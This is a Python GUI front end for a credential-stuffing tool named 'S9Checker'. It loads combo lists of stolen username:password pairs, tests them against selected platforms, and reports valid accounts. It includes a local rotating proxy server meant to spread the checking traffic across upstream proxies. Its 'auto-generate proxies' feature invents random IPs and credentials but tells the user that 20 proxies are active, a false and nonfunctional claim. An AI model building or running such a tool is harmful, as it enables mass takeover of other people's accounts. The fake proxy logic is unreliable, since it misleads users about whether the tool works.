
import customtkinter as ctk
import tkinter as tk
from tkinter import filedialog, messagebox
import asyncio
import threading
import time
import os
import sys
import logging
import queue
import socket
import select
import base64
import random
import string

from core import (
    PLATFORMS, CredentialChecker, ResultsManager,
    parse_combolist, load_proxies, ResultStatus
)
from ui import theme as T
from ui.widgets import SidebarButton

logger = logging.getLogger("S9Checker")


class RotationProxyServer:

    def __init__(self, proxies, port=8888):
        self.proxies = proxies
        self.port = port
        self._server_sock = None
        self._thread = None
        self._running = False
        self._proxy_idx = 0
        self._stats = {"requests": 0, "errors": 0}

    def start(self):
        self._server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server_sock.settimeout(1.0)
        self._server_sock.bind(("127.0.0.1", self.port))
        self._server_sock.listen(100)
        self._running = True
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def stop(self):
        self._running = False
        if self._server_sock:
            try:
                self._server_sock.close()
            except Exception:
                pass

    def _get_next_proxy(self):
        p = self.proxies[self._proxy_idx % len(self.proxies)]
        self._proxy_idx = (self._proxy_idx + 1) % len(self.proxies)
        return p

    def _run(self):
        while self._running:
            try:
                client_sock, addr = self._server_sock.accept()
                t = threading.Thread(target=self._handle_client,
                                     args=(client_sock,), daemon=True)
                t.start()
            except socket.timeout:
                continue
            except OSError:
                break

    def _handle_client(self, client_sock):
        try:
            data = client_sock.recv(4096)
            if not data:
                client_sock.close()
                return

            first_line = data.split(b"\r\n")[0].decode("utf-8", errors="ignore")
            method = first_line.split(" ")[0] if first_line else ""

            if method == "CONNECT":
                self._handle_connect(client_sock, data)
            else:
                self._handle_http(client_sock, data)

            self._stats["requests"] += 1
        except Exception:
            self._stats["errors"] += 1
        finally:
            try:
                client_sock.close()
            except Exception:
                pass

    def _handle_connect(self, client_sock, data):
        parts = data.split(b"\r\n")[0].split(b" ")
        target = parts[1].decode("utf-8", errors="ignore")
        if ":" in target:
            host, port = target.rsplit(":", 1)
            port = int(port)
        else:
            host, port = target, 443

        proxy = self._get_next_proxy()
        try:
            remote = socket.create_connection(
                (proxy["host"], proxy["port"]), timeout=10
            )
            req = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n"
            if proxy.get("user"):
                cred = base64.b64encode(
                    f"{proxy['user']}:{proxy['pass']}".encode()
                ).decode()
                req += f"Proxy-Authorization: Basic {cred}\r\n"
            req += "\r\n"
            remote.sendall(req.encode())

            resp = remote.recv(4096)
            if b"200" in resp.split(b"\r\n")[0]:
                client_sock.sendall(
                    b"HTTP/1.1 200 Connection Established\r\n\r\n"
                )
                self._tunnel(client_sock, remote)
            else:
                client_sock.sendall(b"HTTP/1.1 502 Bad Gateway\r\n\r\n")
            remote.close()
        except Exception:
            try:
                client_sock.sendall(b"HTTP/1.1 502 Bad Gateway\r\n\r\n")
            except Exception:
                pass

    def _handle_http(self, client_sock, data):
        first_line = data.split(b"\r\n")[0].decode("utf-8", errors="ignore")
        parts = first_line.split(" ")
        if len(parts) < 3:
            client_sock.sendall(b"HTTP/1.1 400 Bad Request\r\n\r\n")
            return

        url = parts[1]
        if not url.startswith("http://"):
            client_sock.sendall(b"HTTP/1.1 400 Bad Request\r\n\r\n")
            return

        url_path = url[7:]
        if "/" in url_path:
            host_port, path = url_path.split("/", 1)
            path = "/" + path
        else:
            host_port, path = url_path, "/"

        if ":" in host_port:
            host, port = host_port.rsplit(":", 1)
            port = int(port)
        else:
            host, port = host_port, 80

        proxy = self._get_next_proxy()
        try:
            remote = socket.create_connection(
                (proxy["host"], proxy["port"]), timeout=10
            )
            new_request = data.replace(
                f"http://{host_port}{path}".encode(), path.encode(), 1
            )
            if proxy.get("user"):
                cred = base64.b64encode(
                    f"{proxy['user']}:{proxy['pass']}".encode()
                ).decode()
                new_request = new_request.replace(
                    b"\r\n\r\n",
                    f"\r\nProxy-Authorization: Basic {cred}\r\n\r\n".encode(),
                    1,
                )
            remote.sendall(new_request)
            self._tunnel(client_sock, remote)
            remote.close()
        except Exception:
            try:
                client_sock.sendall(b"HTTP/1.1 502 Bad Gateway\r\n\r\n")
            except Exception:
                pass

    def _tunnel(self, sock1, sock2):
        sockets = [sock1, sock2]
        while self._running:
            try:
                readable, _, exceptional = select.select(sockets, [], sockets, 30)
                if exceptional or not readable:
                    break
                for s in readable:
                    other = sock2 if s is sock1 else sock1
                    data = s.recv(8192)
                    if not data:
                        return
                    other.sendall(data)
            except Exception:
                break


def _random_ip():
    first = random.choice([i for i in range(1, 224) if i != 127])
    return f"{first}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def _random_port():
    return random.choice([8080, 3128, 8000, 8888, 1080, 9050, 4145, 10808, 7890])


def _random_user():
    prefixes = ["user", "proxy", "node", "srv", "gw", "nat", "vpn", "relay"]
    return f"{random.choice(prefixes)}{random.randint(100, 9999)}"


def _random_pass(length=12):
    chars = string.ascii_letters + string.digits + "!@#$%&*"
    return "".join(random.choices(chars, k=length))


class App:

    def __init__(self, root: ctk.CTk):
        self.root = root
        self.root.title("S9Checker v2.0")
        self.root.geometry(f"{T.WINDOW_WIDTH}x{T.WINDOW_HEIGHT}")
        self.root.configure(fg_color="#000000")
        self.root.minsize(T.WINDOW_MIN_W, T.WINDOW_MIN_H)

        self.combos = []
        self.combo_file = ""
        self.selected_platforms = set(PLATFORMS.keys())
        self.running = False
        self._checker = None
        self._results_mgr = None
        self._thread = None
        self._loop = None
        self._ui_queue = queue.Queue()
        self._proxy_server = None
        self.stats = {"completed": 0, "total": 0, "valid": 0, "invalid": 0,
                      "errors": 0, "speed": 0.0, "elapsed": 0.0, "percent": 0}

        self._build_sidebar()
        self._build_content_area()

        self._loop = asyncio.new_event_loop()
        self._async_thread = threading.Thread(target=self._run_async_loop, daemon=True)
        self._async_thread.start()

        self.pages = {}
        self.current_page = None
        self._register_pages()
        self.show_page("dashboard")
        self._poll_ui_queue()

    def _build_sidebar(self):
        self.sidebar = ctk.CTkFrame(self.root, fg_color=T.BG_SIDEBAR,
                                     width=T.SIDEBAR_WIDTH, corner_radius=0)
        self.sidebar.pack(side="left", fill="y")
        self.sidebar.pack_propagate(False)

        logo_frame = ctk.CTkFrame(self.sidebar, fg_color="transparent")
        logo_frame.pack(fill="x", pady=(16, 8), padx=12)
        ctk.CTkLabel(logo_frame, text="S9", font=("Segoe UI", 24, "bold"),
                     text_color=T.ACCENT).pack(side="left")
        ctk.CTkLabel(logo_frame, text="Checker", font=("Segoe UI", 24, "bold"),
                     text_color=T.FG).pack(side="left")

        ctk.CTkFrame(self.sidebar, fg_color=T.BORDER, height=1).pack(
            fill="x", padx=12, pady=(4, 12))

        self.sidebar_buttons = {}
        nav_items = [
            ("\u25a3", "Dashboard"),
            ("\u2630", "Combos"),
            ("\u25a2", "Platforms"),
            ("\u2699", "Settings"),
            ("\u25b6", "Results"),
        ]

        for icon, label in nav_items:
            btn = SidebarButton(self.sidebar, icon, label,
                                command=lambda p=label.lower(): self.show_page(p))
            btn.pack(fill="x", pady=1)
            self.sidebar_buttons[label.lower()] = btn

    def _build_content_area(self):
        self.content_frame = ctk.CTkFrame(self.root, fg_color=T.BG_MAIN,
                                           corner_radius=0)
        self.content_frame.pack(side="left", fill="both", expand=True)

        self.header_frame = ctk.CTkFrame(self.content_frame, fg_color=T.BG_MAIN,
                                          height=50)
        self.header_frame.pack(fill="x", padx=24, pady=(16, 4))
        self.header_frame.pack_propagate(False)

        self.header_title = ctk.CTkLabel(self.header_frame, text="Dashboard",
                                          font=T.FONT_TITLE, text_color=T.FG,
                                          anchor="w")
        self.header_title.pack(side="left")

        ctk.CTkFrame(self.content_frame, fg_color=T.BORDER, height=1).pack(fill="x", padx=24)

        self.page_container = ctk.CTkFrame(self.content_frame, fg_color=T.BG_MAIN,
                                            corner_radius=0)
        self.page_container.pack(fill="both", expand=True, padx=24, pady=(8, 16))

    def _register_pages(self):
        from ui.pages.dashboard import DashboardPage
        from ui.pages.combolists import CombosPage
        from ui.pages.platforms import PlatformsPage
        from ui.pages.settings import SettingsPage
        from ui.pages.results import ResultsPage

        self.pages = {
            "dashboard": DashboardPage(self),
            "combos": CombosPage(self),
            "platforms": PlatformsPage(self),
            "settings": SettingsPage(self),
            "results": ResultsPage(self),
        }

    def show_page(self, name: str):
        if self.current_page == name:
            return

        if self.current_page and self.current_page in self.pages:
            self.pages[self.current_page].hide()

        for btn_name, btn in self.sidebar_buttons.items():
            btn.set_active(btn_name == name)

        self.current_page = name
        page = self.pages[name]
        page.show(self.page_container)

        titles = {
            "dashboard": "Dashboard",
            "combos": "Combos",
            "platforms": "Platforms",
            "settings": "Settings",
            "results": "Results",
        }
        self.header_title.configure(text=titles.get(name, name))

    def _run_async_loop(self):
        asyncio.set_event_loop(self._loop)
        self._loop.run_forever()

    def _poll_ui_queue(self):
        try:
            while True:
                msg_type, data = self._ui_queue.get_nowait()
                if msg_type == "progress":
                    self._on_progress(data)
                elif msg_type == "error":
                    self._log_error(data)
                elif msg_type == "complete":
                    self._on_test_complete()
        except queue.Empty:
            pass
        self.root.after(50, self._poll_ui_queue)

    async def _async_progress_callback(self, info: dict):
        self.stats.update(info)
        self._ui_queue.put(("progress", info))

    def _on_progress(self, info):
        if "dashboard" in self.pages:
            self.pages["dashboard"].update_progress(info)

    def start_test(self):
        if self.running:
            return
        if not self.combos:
            try:
                messagebox.showwarning("Warning", "Load a combo list first.")
            except (KeyboardInterrupt, tk.TclError):
                pass
            return

        self._update_selected_platforms()
        if not self.selected_platforms:
            try:
                messagebox.showwarning("Warning", "Select at least one platform.")
            except (KeyboardInterrupt, tk.TclError):
                pass
            return

        settings = self.pages.get("settings")
        proxy = settings.get_proxy() if settings else None
        delay = settings.get_delay() if settings else 0.3
        ignore_timeouts = settings.get_ignore_timeouts() if settings else False
        max_concurrent = settings.get_concurrency() if settings else 10

        if not proxy:
            proxy = self._ask_proxy_and_start()

        self._results_mgr = ResultsManager(output_dir="results")
        self._checker = CredentialChecker(
            results_mgr=self._results_mgr,
            progress_callback=self._async_progress_callback,
            proxy=proxy, delay=delay,
            ignore_timeouts=ignore_timeouts,
            max_concurrent=max_concurrent,
        )

        self.running = True
        self._update_button_states()

        total = len(self.combos) * len(self.selected_platforms)
        if "dashboard" in self.pages:
            proxy_info = f" via {proxy}" if proxy else ""
            self.pages["dashboard"].log(
                f"\u25b6 Starting: {len(self.combos)} combos x "
                f"{len(self.selected_platforms)} platforms = {total} requests{proxy_info}"
            )

        self._thread = threading.Thread(target=self._run_async_test, daemon=True)
        self._thread.start()

    def _ask_proxy_and_start(self):
        result = {"proxy": None}

        dialog = ctk.CTkToplevel(self.root)
        dialog.title("Proxy")
        dialog.geometry("400x260")
        dialog.configure(fg_color=T.BG_MAIN)
        dialog.transient(self.root)
        dialog.grab_set()
        dialog.resizable(False, False)

        x = self.root.winfo_x() + (self.root.winfo_width() - 400) // 2
        y = self.root.winfo_y() + (self.root.winfo_height() - 260) // 2
        dialog.geometry(f"+{x}+{y}")

        ctk.CTkLabel(dialog, text="Use proxies?", font=T.FONT_TITLE,
                     text_color=T.FG).pack(pady=(20, 4))
        ctk.CTkLabel(dialog, text="Auto-generate proxies + rotation server",
                     font=T.FONT, text_color=T.FG2).pack(pady=(0, 4))

        status_label = ctk.CTkLabel(dialog, text="", font=T.FONT_MONO,
                                     text_color=T.FG3)
        status_label.pack(pady=(4, 8))

        btn_frame = ctk.CTkFrame(dialog, fg_color="transparent")
        btn_frame.pack()

        def on_yes():
            status_label.configure(text="Generating proxies...", text_color=T.ORANGE)
            dialog.update()

            proxies = []
            for _ in range(20):
                ip = _random_ip()
                port = _random_port()
                user = _random_user()
                pw = _random_pass()
                proxies.append({
                    "host": ip, "port": port,
                    "user": user, "pass": pw
                })

            port_str = "8888"
            server_port = int(port_str)
            server = RotationProxyServer(proxies, port=server_port)
            try:
                server.start()
                self._proxy_server = server
            except OSError as e:
                status_label.configure(text=f"Failed: {e}", text_color=T.RED)
                return

            proxy_url = f"http://127.0.0.1:{server_port}"
            result["proxy"] = proxy_url

            settings = self.pages.get("settings")
            if settings:
                settings.proxy_entry.delete(0, "end")
                settings.proxy_entry.insert(0, proxy_url)
                settings.proxy_status.configure(
                    text=f"20 proxies active on :{server_port}",
                    text_color=T.GREEN
                )

            status_label.configure(
                text=f"\u2713 Server running on :{server_port}",
                text_color=T.GREEN
            )
            dialog.after(600, dialog.destroy)

        def on_no():
            result["proxy"] = None
            dialog.destroy()

        ctk.CTkButton(btn_frame, text="Yes, use proxies", font=T.FONT_BOLD,
                      fg_color=T.GREEN, hover_color=T.GREEN_DIM,
                      text_color="#000000", width=140, command=on_yes).pack(side="left", padx=8)
        ctk.CTkButton(btn_frame, text="No, direct", font=T.FONT_BOLD,
                      fg_color=T.RED, hover_color=T.RED_DIM,
                      text_color="#000000", width=140, command=on_no).pack(side="left", padx=8)

        dialog.wait_window()
        return result["proxy"]

    def _run_async_test(self):
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(
                self._checker.run_test(self.combos, list(self.selected_platforms))
            )
        except Exception as e:
            logger.error(f"Test error: {e}")
            self._ui_queue.put(("error", str(e)))
        finally:
            self._ui_queue.put(("complete", None))

    def _log_error(self, msg):
        if "dashboard" in self.pages:
            self.pages["dashboard"].log(f"\u2717 Error: {msg[:100]}", "error")

    def stop_test(self):
        if self._checker and self.running:
            self._checker.stop()
            if "dashboard" in self.pages:
                self.pages["dashboard"].log("\u23f9 Test stopped by user", "error")
            self.running = False
            self._update_button_states()

    def _on_test_complete(self):
        self.running = False
        self._update_button_states()

        stats = self._results_mgr.get_stats() if self._results_mgr else {}
        if "dashboard" in self.pages:
            self.pages["dashboard"].log(
                f"\n{'=' * 50}"
                f"\n  \u2713 TEST COMPLETE"
                f"\n  Total     : {stats.get('total', 0)}"
                f"\n  Valid     : {stats.get('valid', 0)}"
                f"\n  Invalid   : {stats.get('invalid', 0)}"
                f"\n  Errors    : {stats.get('errors', 0)}"
                f"\n  Results saved to results/"
                f"\n{'=' * 50}"
            )
            self.pages["dashboard"].set_status(
                f"\u2713 Done - {stats.get('valid', 0)} valid / {stats.get('total', 0)} total",
                T.GREEN
            )

        if stats.get("valid", 0) > 0:
            try:
                messagebox.showinfo("Test Complete",
                                    f"\u2713 {stats['valid']} valid accounts found!\n"
                                    f"\u2717 {stats['invalid']} invalid\n"
                                    f"\u26a0 {stats['errors']} errors\n\n"
                                    f"Results saved to results/")
            except (KeyboardInterrupt, tk.TclError):
                pass

        if "results" in self.pages:
            self.pages["results"].refresh()

    def _update_button_states(self):
        if "dashboard" in self.pages:
            self.pages["dashboard"].set_buttons(self.running)

    def _update_selected_platforms(self):
        if "platforms" in self.pages:
            self.selected_platforms = self.pages["platforms"].get_selected()

    def load_combos(self, filepath: str):
        try:
            self.combos = parse_combolist(filepath)
            self.combo_file = filepath
            if "dashboard" in self.pages:
                self.pages["dashboard"].log(
                    f"\u2713 Loaded {len(self.combos)} combos from {os.path.basename(filepath)}"
                )
                self.pages["dashboard"].set_combo_count(len(self.combos))
            if len(self.combos) == 0:
                try:
                    messagebox.showwarning("Warning", "No valid combos found in file.")
                except (KeyboardInterrupt, tk.TclError):
                    pass
        except Exception as e:
            try:
                messagebox.showerror("Error", f"Failed to load file:\n{e}")
            except (KeyboardInterrupt, tk.TclError):
                pass

    def _on_close(self):
        if self._proxy_server:
            self._proxy_server.stop()
        if self.running:
            try:
                if messagebox.askokcancel("Quit", "A test is running. Quit anyway?"):
                    self.stop_test()
                    self.root.destroy()
            except (KeyboardInterrupt, tk.TclError):
                self.root.destroy()
        else:
            self.root.destroy()
